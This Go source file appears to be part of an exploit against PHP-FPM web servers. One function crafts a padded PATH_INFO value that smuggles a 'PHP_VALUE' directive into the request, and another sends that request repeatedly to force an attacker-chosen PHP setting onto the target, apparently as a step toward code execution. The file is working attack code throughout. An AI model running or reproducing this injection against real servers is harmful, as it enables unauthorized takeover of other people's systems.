package main

import (
	"fmt"
	"log"
	"strings"
)

func MakePathInfo(phpValue string) string {
	pi := "/PHP_VALUE\n" + phpValue
	if len(pi) > PosOffset {
		panic(fmt.Errorf("MakePathInfo called on long value: %v", phpValue))
	}
	return pi + strings.Repeat(";", PosOffset-len(pi))
}

func SetSetting(requester *Requester, params *AttackParams, setting string) error {
	log.Printf("Trying to set %#v...", setting)
	for i := 0; i < SettingEnableRetries; i++ {
		_, _, err := requester.Request(MakePathInfo(setting), params)
		if err != nil {
			return fmt.Errorf("error while setting %#v: %v", setting, err)
		}
	}
	return nil
}
